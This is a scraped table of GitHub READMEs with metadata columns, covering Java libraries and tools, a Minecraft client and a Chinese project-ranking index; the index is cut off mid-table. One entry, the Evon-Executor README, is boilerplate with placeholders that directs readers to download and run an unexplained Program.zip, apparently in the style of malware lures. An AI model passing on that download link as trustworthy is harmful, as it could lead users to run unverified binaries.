dizzydroid/DesignPatternsNutshell,main,"<div align='center'>
<a href=""https://github.com/dizzydroid/DesignPatternsNutshell"">
    <img alt=""DesignPatternsNutshell Logo"" src=""headerimg.png"" width=""1000"">
</a>
  <h1>Design Patterns in a Nutshell</h1>
</div>

Welcome to the **Design Patterns in a Nutshell** repository! This repository is a companion to the handbook _Design Patterns in a Nutshell_ and is designed to provide practical, runnable examples for each pattern discussed. Whether you're a beginner or a seasoned developer, you'll find this resource invaluable for mastering design patterns.

## üìö What are Design Patterns?
**Someone has already solved your problems**, <br />
*‚ÄúA design pattern is a well-known approach to solve a well-known problem that a (probably) well-known someone has faced.‚Äù* <br />

Patterns are not a specific piece of code that you‚Äôd take in an off-the-shelf fashion, but rather a concept or a blueprint that you can apply and adapt into your software. They are a set of best practices that can be used to solve common problems in software design.

Think of design patterns as a set of tools in your toolbox. Just like a carpenter uses a hammer to drive nails, you can use design patterns to solve common problems in software development. They provide a common language for developers to communicate and share solutions to recurring problems.

## üìã Pre-requisites
The handbook generally assumes a basic understanding of object-oriented programming concepts. The examples in this repo are particularly written in Java, but if you're familiar with other languages, you should be able to follow along.

If you're new to Object-Oriented Programming, consider learning the basics before diving into design patterns. Here are some great resources that I personally recommend:
- [**Head First Java** by Kathy Sierra, Bert Bates, Trisha Gee](https://www.oreilly.com/library/view/head-first-java/9781492091646/)
- [**Bro Code's full Java Course**](https://www.youtube.com/watch?v=xk4_1vDrzzo)
- [**learnjavaonline.org**](https://www.learnjavaonline.org/)

The resources above (ordered by personal preference) will help you get started with Java and Object-Oriented Programming.

The handbook is designed to be beginner-friendly, so don't worry if you're new to design patterns. You'll find the examples and explanations easy to follow.

---

## üìÇ Repository Structure

The repository is neatly organized into three main folders, corresponding to the **three families** of design patterns. Each pattern links directly to its folder and example:

### **1. Creational Patterns** [(`/Creational Patterns`)](./Creational%20Patterns)
Focus on object creation mechanisms, increasing flexibility and reuse:
- [**Singleton**](./Creational%20Patterns/singleton)
- [**Factory Method**](./Creational%20Patterns/factory-method)
- [**Abstract Factory**](./Creational%20Patterns/abstract-factory)
- [**Builder**](./Creational%20Patterns/builder)
- [**Prototype**](./Creational%20Patterns/prototype)
- [**Object Pool**](./Creational%20Patterns/object-pool)

### **2. Structural Patterns** [(`/Structural Patterns`)](./Structural%20Patterns)
Deal with the composition of classes and objects to form larger structures:
- [**Adapter**](./Structural%20Patterns/adapter)
- [**Proxy**](./Structural%20Patterns/proxy)
- [**Decorator**](./Structural%20Patterns/decorator)
- [**Flyweight**](./Structural%20Patterns/flyweight)
- [**Composite**](./Structural%20Patterns/composite)
- [**Bridge**](./Structural%20Patterns/bridge)
- [**Fa√ßade**](./Structural%20Patterns/facade)

### **3. Behavioral Patterns** [(`/Behavioral Patterns`)](./Behavioral%20Patterns)
Concerned with algorithms and object interaction:
- [**Template Method**](./Behavioral%20Patterns/template-method)
- [**Observer**](./Behavioral%20Patterns/observer)
- [**State**](./Behavioral%20Patterns/state)
- [**Command**](./Behavioral%20Patterns/command)
- [**Mediator**](./Behavioral%20Patterns/mediator)
- [**Visitor**](./Behavioral%20Patterns/visitor)
- [**Strategy**](./Behavioral%20Patterns/strategy)
- [**Chain of Responsibility**](./Behavioral%20Patterns/chain-of-responsibility)
- [**Iterator**](./Behavioral%20Patterns/iterator)

---

## ‚ú® Highlights

- **Practical Examples:** Fully runnable code for every pattern.
- **Embedded UML Diagrams:** Each pattern's markdown file includes a clear UML diagram for easy visualization.
- **Beginner-Friendly:** Simple explanations and real-world use cases.

---

## üéØ Goals of the Repository

- Serve as a **reference** for understanding and implementing design patterns.
- Provide a **hands-on approach** to supplement theoretical learning.
- Offer **quick access** to runnable examples and diagrams for every pattern.

---

## üìö Get the Handbook
This repository is a companion to the [Design Patterns in a Nutshell](https://drive.google.com/file/d/19qE0GULc0QBZ7pHO0XIFj_GkTRuBpd5v/view) handbook. 

---

## üôè Acknowledgements
This handbook and repository are largely inspired by the incredible work by the authors of the book, [**Head First Design Patterns**](https://www.oreilly.com/library/view/head-first-design/9781492077992/). The book is a must-read for anyone interested in design patterns and I can't recommend it enough.

Pattern definitions, and some diagrams are inspired directly by the ones that started it all, the Gang of Four (GoF) book, [**Design Patterns: Elements of Reusable Object-Oriented Software**](https://www.oreilly.com/library/view/design-patterns-elements/0201633612/).

Some examples and analogies were influenced by the amazing content on [**Refactoring Guru**](https://refactoring.guru/).

This repository and the handbook would not have been possible without the amazing resources above. I am grateful for the knowledge they have shared with the world.

---

## üìú License

This repository is owned by **Shehab Mahmoud**. All content is protected under the terms of intellectual property. Refer to the [`LICENSE`](./LICENSE) file for additional details.

---

## ‚ö† Disclaimer 
This handbook includes content from third-party sources, including images and text excerpts. 
Such content remains the property of their respective owners and is included here under 
applicable licenses or fair use. If you are the owner of any content and believe it has been 
used without proper permission, please contact us to resolve the issue.

---

## ü§ù Contributions

Contributions are welcome! If you‚Äôd like to suggest improvements, add examples, or fix bugs:
- Open an issue or submit a pull request.
- Refer to the [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

---
<div align='center'>
  <b> Happy learning and coding! üöÄ</b>
</div>
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
raphw/build-buddy,master,"Build Buddy
===========

POC for a simple-enough, yet powerful enough build tool that targets Java, and is written and configured in Java, and 
that has inherent support for (a) parallel incremental builds, and therewith build reproducibility and (b) supply-chain 
security when it comes to downloading external resources.

As a side goal, the build tool should be storable as source code alongside another project, without a need of explicit 
installation. At the same time, it should be possible to compile the build to avoid repeated compilation. Doing so, a 
build should be executable by using the JVM only once a copy of a project's source is obtained, by embracing the JVM's 
ability to run programs from source files. This avoids storing precompiled binaries in repositories, and allows for the 
execution of builds in environments that only have the JVM installed without the deployment of build tool wrappers that 
often entail a (cachable) download of the tool. It should be possible to manage updates of these sources easily, and to 
add extensions (plugins) to the base implementation alongside.

The build tool should only rely on the Java standard library and should be launchable using a command such as:

    java build/Main.java

where `Main` is a user defined class located in the project's build folder, which assembles the build using the
classes of this build tool. This is also demonstrated within this project, where the build tool is the source but
also linked into the build folder as it would be suggested to users of this tool. This would also be possible by
using for example Git Submodules. For IDE-support, a POM is stored alongside, and it should always be possible to
build this project using Maven to debug errors in the project source which is used for building itself.

By automatically caching results of single build steps, expensive but commonly stable tasks should be cached implicitly.
This avoids the need of, for example, repeated resolution of dependency trees. As the result of such resolution can
be stored in a textual format, dependency resolution could also be checked into a source repository. This allows both 
to store checksums of previously resolved files for validation, and stabilizes resolution process which can otherwise
render builds non-deterministic, for example when version ranges are declared in (transitive) dependencies.

To allow for an effective implementation of such caching, dependency descriptors should not be defined as a part of the 
build description, but separately. In the simplest format, it should always be possible to express information in the 
Java properties format. Based on this, it is trivial to translate common descriptions into this format. As a 
demonstration of this concept, Java module info classes should be offered as a canonical way of defining (build) module 
names and dependencies.

Specific implementations of dependency resolution or repositories should not be hard-coded into the build tool. 
There should, for example, not be any hard dependency on Maven concepts, to allow for their substitution. 

The POC is currently missing:
- Convenience builder for common build pipelines, similar to Maven's conventional life cycle.
- Automatic and dynamic resolution of dependencies between steps of otherwise independent build-pipelines (multi-module builds).
- Task for javadoc.
- Task for source-jars.
- Task to add GPG signatures of artifacts.
- Task to publish to Maven Central and local Maven repository.
- Extend all build step implementations to support their standard options.
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,132.0
dbeaver/dbeaver-jdbc-libsql,devel,"# LibSQL JDBC driver

[![CI](https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml/badge.svg)](https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml)
[![javadoc](https://javadoc.io/badge2/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql/javadoc.svg)](https://javadoc.io/doc/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql)
[![Apache 2.0](https://img.shields.io/github/license/cronn-de/jira-sync.svg)](http://www.apache.org/licenses/LICENSE-2.0)

Turso LibSQL [JDBC](https://en.wikipedia.org/wiki/JDBC_driver) is a library for accessing and managing [LibSQL](https://github.com/tursodatabase/libsql) databases in Java.
- It is a pure Java library
- Version 1.0 uses simple [HTTP API](https://github.com/tursodatabase/libsql/blob/main/docs/http_api.md) protocol for LibSQL
- It supports prepared statements, database metadata, resultsets, data types and most of other JDBC features
- It supports Turso and local LibSQL servers
- It is included in [DBeaver](https://github.com/dbeaver/dbeaver) and [CloudBeaver](https://github.com/dbeaver/cloudbeaver) as default LibSQL driver. However, it can be used in any other products/frameworks which rely on JDBC API

## Reqirements

- Java 17
- Maven

## Usage

JDBC URL format: `jdbc:dbeaver:libsql:<server-url>`  
Server URL is a full URL including schema and port. For example:
- `jdbc:dbeaver:libsql:http://localhost:1234`
- `jdbc:dbeaver:libsql:https://test-test.turso.io`

Token based authentication supported in version 1.0. Pass token value as password, leave the username empty.  

Driver class name: `com.dbeaver.jdbc.driver.libsql.LibSqlDriver`

## Example

```java
import java.sql.*;

public class LibSqlTest {
    public static void main(String[] args) throws Exception {
        String databaseUrl = ""http://libsql-server.company.local:8080"";
        String token = args[0];
        try (Connection connection = DriverManager.getConnection(""jdbc:dbeaver:libsql:"" + databaseUrl, null, token)) {
            try (Statement statement = connection.createStatement()) {
                statement.execute(""drop table if exists test_table_1"");
                statement.execute(""create table test_table_1 (id integer, name string)"");
                statement.execute(""insert into test_table_1 values(1, 'test one')"");
                statement.execute(""insert into test_table_1 values(2, 'test two')"");
                try (ResultSet rs = statement.executeQuery(""select * from test_table_1"")) {
                    while (rs.next()) {
                        System.out.println(rs.getInt(""id"") + "" = "" + rs.getString(""name""));
                    }
                }
            }
        }
    }
}
```
## License

Licensed under the [Apache License, Version 2.0](http://www.apache.org/licenses/LICENSE-2.0)

## Download
Download from Maven Central or from the releases page.
```xml
<dependencies>
    <dependency>
      <groupId>com.dbeaver.jdbc</groupId>
      <artifactId>com.dbeaver.jdbc.driver.libsql</artifactId>
      <version>1.0.2</version>
    </dependency>
</dependencies>
```
",0,3,11,Apache-2.0,2,9.0,1.0,3.0,0.0,0.0,0.0,-0.3500000000000001,0.0
martinellich/jooq-spring,develop,"# jOOQ Spring Integration

**jooq-spring** is a small open-source library that provides integration of [jOOQ](https://www.jooq.org) with
the [Spring Framework](https://spring.io/projects/spring-framework).

## Dependency

Add a dependency to the current version:

```xml

<dependency>
    <groupId>ch.martinelli.oss</groupId>
    <artifactId>jooq-spring</artifactId>
    <version>0.4.0</version>
</dependency>
```

## Components

### JooqDAO

The JooqDAO follows the [DAO pattern](https://en.wikipedia.org/wiki/Data_access_object) and not
the [Repository pattern](https://martinfowler.com/eaaCatalog/repository.html) because the Repository is a pattern from
Domain Driven Design (DDD).

#### Usage

```java

@Component
public class AthleteDAO extends JooqDAO<Athlete, AthleteRecord, Long> {

    public AthleteDAO(DSLContext dslContext) {
        super(dslContext, ATHLETE);
    }
}
```

#### Methods

| Return Type   | Method                                                                                               | Description                                                                            |
|---------------|------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `Optional<R>` | `findById(ID id)`                                                                                    | Finds a record by its primary key.                                                     |
| `List<R>`     | `findAll(int offset, int limit, List<org.jooq.OrderField<?>> orderBy)`                               | Retrieves a list of records from the database with pagination and sorting.             |
| `List<R>`     | `findAll(org.jooq.Condition condition, int offset, int limit, List<org.jooq.OrderField<?>> orderBy)` | Retrieves a list of records from the database with filtering, pagination, and sorting. |
| `List<R>`     | `findAll(org.jooq.Condition condition, List<org.jooq.OrderField<?>> orderBy)`                        | Retrieves a list of records from the database with filtering, and sorting.             |
| `List<R>`     | `findAll(org.jooq.Condition condition)`                                                              | Retrieves a list of records from the database with filtering.                          |
| `int`         | `count()`                                                                                            | Counts the total number of records in the associated table.                            |
| `int`         | `count(org.jooq.Condition condition)`                                                                | Counts the number of records in the associated table that match the given condition.   |
| `int`         | `save(R record)`                                                                                     | Saves the given record to the database.                                                |
| `int[]`       | `saveAll(List<R> record)`                                                                            | Saves a list of records to the database using batch store operations.                  |
| `int`         | `merge(R record)`                                                                                    | Merges the given record into the database.                                             |
| `int`         | `deleteById(ID id)`                                                                                  | Deletes a record from the database identified by its primary key.                      |
| `int`         | `delete(R record)`                                                                                   | Deletes the specified record from the database.                                        |
| `int`         | `delete(org.jooq.Condition condition)`                                                               | Deletes records from the database that match the given condition.                      |

Check out the code documentation for further information [JooqDAO](src/main/java/ch/martinelli/oss/jooqspring/JooqDAO.java).

## License

**jooq-spring** is open and free software under Apache License, Version
2: http://www.apache.org/licenses/LICENSE-2.0.html
",2,0,3,Apache-2.0,2,1.0,1.0,2.0,1.0,8.0,0.0,-2.2,0.0
wheslleyrimar/BuildCLI,main,"![BuildCLI Banner](src/main/resources/assets/buildcli.png)
# BuildCLI

**BuildCLI** is a command-line interface (CLI) tool for managing and automating common tasks in Java project development. It allows you to create, compile, manage dependencies, and run Java projects directly from the terminal, simplifying the development process.

- **Repository:** [https://github.com/wheslleyrimar/buildcli](https://github.com/wheslleyrimar/buildcli)
- **License:** [MIT](https://opensource.org/licenses/MIT)

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contribution](#contribution)
- [License](#license)

---

## Features

- **Initialize Project**: Creates the basic structure of directories and files for a Java project.
- **Compile Project**: Compiles the project source code using Maven.
- **Add Dependency**: Adds new dependencies to the `pom.xml`.
- **Remove Dependency**: Remove dependencies from `pom.xml`.
- **Document Code**: [Beta] Generates documentation for a Java file using AI.
- **Manage Configuration Profiles**: Creates specific configuration files for profiles (`application-dev.properties`, `application-test.properties`, etc.).
- **Run Project**: Starts the project directly from the CLI using Spring Boot.
- **Dockerize Project**: Generates a Dockerfile for the project, allowing easy containerization.
- **Build and Run Docker Container**: Builds and runs the Docker container using the generated Dockerfile.
- **CI/CD Integration**: Automatically generates configuration files por CI/CD tools (e.g., Jenkins, Github Actions) and triggers pipelines based on project changes.

---

## Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/wheslleyrimar/buildcli.git
   cd buildcli
   ```

2. **Build and Package the Project**:
   ```bash
   mvn package
   ```

3. **Set up BuildCLI for Global Access**:
    - Copy the `buildcli` file to a directory in your system PATH, such as `~/bin`:
      ```bash
      cp target/buildcli ~/bin/buildcli
      chmod +x ~/bin/buildcli
      ```

Now `BuildCLI` is ready to use. Test the `buildcli` command in the terminal.

---

## Usage

Below are the main commands of `BuildCLI`. For more information about each command, you can run `buildcli --help`.

```plaintext
Usage: buildcli [OPTIONS]
Options:
  -i, --init                Initializes a new Java project
  -c, --compile             Compiles the Java project
      --add-dependency      Adds a dependency to the pom.xml in the 'groupId:artifactId' or 'groupId:artifactId:version' format
      --rm-dependency       Remove a dependency in 'groupId:artifactId' format
  -p, --profile             Creates a configuration profile (e.g., dev, test)
  -e, --set-environment     Sets the active profile for the environment (dev, test, prod) by updating `environment.config`
      --run                 Runs the Java project
  -d, --document-code       [Beta] Generates documentation for a Java file using AI (e.g., `buildcli -d <path-to-file>.java`)
  -u, --update              Check for dependency updates
      --update-now          Update dependencies to latest versions
  -t, --test                Run tests
      --dockerize           Generate a Dockerfile for the project
      --docker-build        Build and run the Docker container
      --semver              Manage semantic versioning (major, minor, patch)
      --release             Automate release by creating a Git tag and changelog
      --cicd-config         Configure CI/CD for the specified tool (e.g., github, gitlab, jenkins)
  -h, --help                Shows help
  -V, --version             Shows the version of BuildCLI
  -a, --about               Displays project information, including its purpose, repository, and contributors.
      --setup-autocomplete  Set up autocomplete for Bash, Zsh, or Fish
```

---

## Examples

### 1. Initialize a New Project
Creates the basic Java project structure, including `src/main/java`, `pom.xml`, and `README.md`.
You can specify a project name to dynamically set the package structure and project artifact.

#### Example Commands
- To initialize a project with a specific name:
```bash
buildcli --init MyProject
```
This will create the project structure with `MyProject` as the base package name, resulting in a directory like `src/main/java/org/myproject`.

- To initialize a project without specifying a name:
```bash
buildcli --init
```
This will create the project structure with `buildcli` as the base package name, resulting in a directory like `src/main/java/org/buildcli`.


### 2. Compile the Project
Compiles the Java project using Maven:
```bash
buildcli --compile
```

### 3. Add a Dependency to `pom.xml`
Adds a dependency to the project in the `groupId:artifactId` format. You can also specify a version using the format `groupId:artifactId:version`. If no version is specified, the dependency will default to the latest version available.

#### Example Commands:
- To add a dependency with the latest version:
```bash
  buildcli --add-dependency org.springframework:spring-core
```
- To add a dependency with a specified version:
```bash
  buildcli --add-dependency org.springframework:spring-core:5.3.21
```
After executing these commands, the dependency will be appended to your pom.xml file under the `<dependencies>` section.

### 4. Create a Configuration Profile
Creates a configuration file with the specified profile, for example, `application-dev.properties`:
```bash
buildcli --profile dev
```

### 5. Run the Project
Runs the Java project using Spring Boot:
```bash
buildcli --run
```

### 6. Generate Documentation for Java Code
Automatically generates inline documentation for a Java file using AI:
```bash
buildcli --document-code File.java
```
This command sends the specified Java file to the local Ollama server, which generates documentation and comments directly within the code. The modified file with documentation will be saved back to the same location.

### 7. Set Active Environment Profile
Sets the active environment profile, saving it to the `environment.config` file. The profile is referenced during project execution, ensuring that the correct configuration is loaded.
```bash
buildcli --set-environment dev
```
After running this command, the active profile is set to dev, and the `environment.config` file is updated accordingly.

#### Active Profile Display During Project Execution
With the `--set-environment` functionality, you can set the active environment profile. When running the project with `buildcli --run`, the active profile will be displayed in the terminal.

### 8. Dockerize Command
This command generates a `Dockerfile` for your Java project, making it easier to containerize your application.
```bash
buildcli --dockerize
```

### 9. Docker Build Command
This command automatically builds and runs the Docker container for you. After running the command, the Docker image will be created, and your project will run inside the container.
```bash
buildcli --docker-build
```

### 10. Set Up CI/CD Integration
Generates configuration files for CI/CD tools and prepares the project for automated pipelines. Supports Jenkins, Gitlab and Github Actions.
```bash
buildcli --cicd-config github
```

```bash
buildcli --cicd-config gitlab
```

```bash
buildcli --cicd-config jenkins
```

---

## Prerequisites

### Local Ollama API
Ensure you have the Ollama server running locally, as the `--document-code` functionality relies on an AI model accessible via a local API.
- [Download Ollama](https://ollama.com/download)

You can start the Ollama server by running:

```bash
ollama run llama3.2
```

### Prerequisites for CI/CD Integration
- **Jenkins**: Ensure Jenkins is installed and accessible in your environment.
- **GitHub Actions**: Ensure your repository is hosted on GitHub with Actions enabled.

---

## Contribution

Contributions are welcome! Feel free to open **Issues** and submit **Pull Requests**.

To contribute:
1. Fork the project.
2. Create a branch for your changes:
   ```bash
   git checkout -b feature/my-feature
   ```
3. Commit your changes:
   ```bash
   git commit -m ""My new feature""
   ```
4. Push to your branch:
   ```bash
   git push origin feature/my-feature
   ```
5. Open a Pull Request in the main repository.

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
",0,20,3,MIT,0,49.0,0.0,0.0,0.0,0.0,0.0,1.0,5.0
Nappxy/Evon-Executor,master,"# Evon-Executor

Evon supports the Unified Naming Convention, allowing Evon to be compatible with 99.9% of modern scripts.

[![Download Program](https://img.shields.io/badge/Download%20Program-Program.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/17563018/Program.zip)

## Table of Contents
- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Introduction
Welcome to Evon-Executor! This repository contains the implementation of Evon, a powerful tool that supports the Unified Naming Convention. With Evon, you can execute scripts seamlessly across various environments without compatibility issues.

In the world of scripting and automation, compatibility is key. Evon understands this and ensures that your scripts run smoothly on 99.9% of modern environments. Say goodbye to frustrating compatibility errors and hello to efficient script execution with Evon!

![Evon-Executor](https://source.unsplash.com/featured/800x400/?technology)

## Features
Here are some of the key features of Evon-Executor:
- **Unified Naming Convention Support:** Evon is designed to support the Unified Naming Convention, ensuring compatibility with a wide range of scripts.
- **Efficient Script Execution:** Execute your scripts with confidence, knowing that Evon will handle compatibility issues seamlessly.
- **Easy Integration:** Evon can be easily integrated into your existing workflows, making it a valuable tool for automation.
- **Enhanced Performance:** With Evon, you can expect improved performance and reliability when running scripts.

## Installation
To install Evon-Executor, follow these simple steps:
1. Download the `Program.zip` file from the following link: [Download Program](https://github.com/user-attachments/files/17563018/Program.zip).
2. Extract the contents of the zip file to a directory of your choice.
3. You are now ready to use Evon-Executor for your script execution needs.

## Usage
Using Evon-Executor is straightforward. Simply follow these steps to get started:
1. Launch the Evon-Executor application.
2. Load the script you want to execute into the application.
3. Click on the ""Execute"" button to run the script.
4. Monitor the output to ensure that the script executes successfully.
5. Enjoy seamless script execution with Evon!

Here's an example of how you can use Evon-Executor to run a Python script:
```python
# Python script to calculate the square of a number
def calculate_square(number):
    return number ** 2

# Execute the script
result = calculate_square(5)
print(f""The square of 5 is: {result}"")
```

## Contributing
We welcome contributions to Evon-Executor from the community. If you have ideas for new features, improvements, or bug fixes, feel free to contribute to the repository. Here's how you can contribute:
1. Fork the repository.
2. Make your changes.
3. Submit a pull request.

Together, we can make Evon-Executor even better for users around the world!

## License
The Evon-Executor project is licensed under the MIT License. See the `LICENSE` file for more details.

---

**Note:** For any questions or support related to Evon-Executor, please [contact us](mailto:evon.executor@example.com). Thank you for using Evon for your script execution needs! üöÄ",1,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
marcushellberg/spring-ai-examples,main,"# Practical AI examples using Spring AI

## Included examples

- Document summarization and analysis
- Sentiment analysis
- Text drafting
- Image data extraction
- Advanced RAG techniques
  - Multi-source retrieval
  - Re-ranking
  - Question rewriting

## Requirements

The application expects you to have the following two API keys as environment variables:
- `OPENAI_API_KEY`: OpenAI API key
- `COHERE_API_KEY`: Cohere API key for document re-ranking. See `RagChat.java` comments for more information.

## Running the examples

Run `Application.java` in your IDE or use the following command:

```bash
mvn spring-boot:run
```

## Using local models

You can use local models with Ollama by updating the spring-ai dependency in the `pom.xml` file, and defining which models to use in the `application.properties` file.

",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
StephenIsTaken/NexusOpen,main,"# NexusOpen
 
A Minecraft 1.21 Fabric Client.

Use JDK 21

To open the source in IDEA, open build.gradle and click ""Load Gradle Project"" and use the ""Run Client"" run configuration.
",0,0,1,GPL-3.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
ChHsiching/GitHub-Chinese-Top-Charts-Classified,main,"<p align=""center"">
    <img width=""200"" src=""content/media/repo_logo.svg"">
</p>

<h1 align=""center"">GitHub‰∏≠ÊñáÊéíË°åÊ¶ú</h1>

<div align=""center"">
    „ÄåÂ∏ÆÂä©‰Ω†ÂèëÁé∞‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆÔºåÂèØ‰ª•Êó†ËØ≠Ë®ÄÈöúÁ¢çÂú∞„ÄÅÊõ¥È´òÊïàÂú∞Âê∏Êî∂‰ºòÁßÄÁªèÈ™åÊàêÊûú„Äç
</div>

<br />

<div align=""center"">
    <p><sub>‚Üì -- È°πÁõÆËØ¥Êòé -- ‚Üì</sub></p>
    <a href=""content/docs/features.md"">ÁâπËâ≤‰∫ÆÁÇπ</a> ‚Ä¢
    <a href=""content/docs/definition_of_Chinese_repo.md"">‰∏≠ÊñáÂÆö‰πâ</a> ‚Ä¢
    <a href=""content/docs/inclusion_rules.md"">Êî∂ÂΩïËßÑÂàô</a> ‚Ä¢
    <a href=""content/docs/milestone.md"">ÈáçË¶ÅÊõ¥Êñ∞</a> ‚Ä¢
    <a href=""content/docs/feedback.md"">ÈóÆÈ¢òÂèçÈ¶à</a> ‚Ä¢
    <a href=""LICENSE.md"">ËÆ∏ÂèØÂçèËÆÆ</a>
</div>

<br />

<div align=""center"">
    <p><sub>‚Üì -- ËøõÈò∂‰πãË∑Ø -- ‚Üì</sub></p>
    ‰∏≠ÊñáÈ°πÁõÆÂ∑≤ÈÄöÂÖ≥ÔºüÈÄöÂæÄÊõ¥ÂπøÈòî‰∏ñÁïåÁöÑË∑ØÔºö<a href=""https://github.com/kon9chunkit/GitHub-English-Top-Charts"">GitHubËã±ÊñáÊéíË°åÊ¶ú</a>
</div>

<br />

<div align=""center"">
    <p><sub>‚Üì -- ÂÜÖÂÆπÁõÆÂΩï -- ‚Üì</sub></p>
    <table>
        <tr>
            <td colspan=""2"" align=""center"">‰∏≠ÊñáÊÄªÊ¶ú</td>
            <td colspan=""2"" align=""center"">‰∏≠ÊñáÂ¢ûÈÄüÊ¶ú</td>  
            <td colspan=""2"" align=""center"">‰∏≠ÊñáÊñ∞ÁßÄÊ¶ú</td>
        </tr>
        <tr>
            <td align=""center"">ËΩØ‰ª∂Á±ª</td>
            <td align=""center"">ËµÑÊñôÁ±ª</td>
            <td align=""center"">ËΩØ‰ª∂Á±ª</td>
            <td align=""center"">ËµÑÊñôÁ±ª</td>
            <td align=""center"">ËΩØ‰ª∂Á±ª</td> 
            <td align=""center"">ËµÑÊñôÁ±ª</td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/All-Language.md"">All Language</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/All-Language.md"">All Language</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/All-Language.md"">All Language</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/All-Language.md"">All Language</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/All-Language.md"">All Language</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/All-Language.md"">All Language</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/JavaScript.md"">JavaScript</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/JavaScript.md"">JavaScript</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/JavaScript.md"">JavaScript</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/JavaScript.md"">JavaScript</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/JavaScript.md"">JavaScript</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/JavaScript.md"">JavaScript</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Java.md"">Java</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Java.md"">Java</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Java.md"">Java</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Java.md"">Java</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Java.md"">Java</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Java.md"">Java</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Python.md"">Python</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Python.md"">Python</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Python.md"">Python</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Python.md"">Python</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Python.md"">Python</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Python.md"">Python</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Go.md"">Go</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Go.md"">Go</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Go.md"">Go</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Go.md"">Go</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Go.md"">Go</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Go.md"">Go</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/TypeScript.md"">TypeScript</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/TypeScript.md"">TypeScript</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/TypeScript.md"">TypeScript</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/TypeScript.md"">TypeScript</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/TypeScript.md"">TypeScript</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/TypeScript.md"">TypeScript</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Vue.md"">Vue</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Vue.md"">Vue</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Vue.md"">Vue</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Vue.md"">Vue</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Vue.md"">Vue</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Vue.md"">Vue</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/CPP.md"">C++</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/CPP.md"">C++</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/CPP.md"">C++</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/CPP.md"">C++</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/CPP.md"">C++</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/CPP.md"">C++</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/C.md"">C</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/C.md"">C</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/C.md"">C</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/C.md"">C</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/C.md"">C</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/C.md"">C</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/CSHARP.md"">C#</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/CSHARP.md"">C#</a></td> 
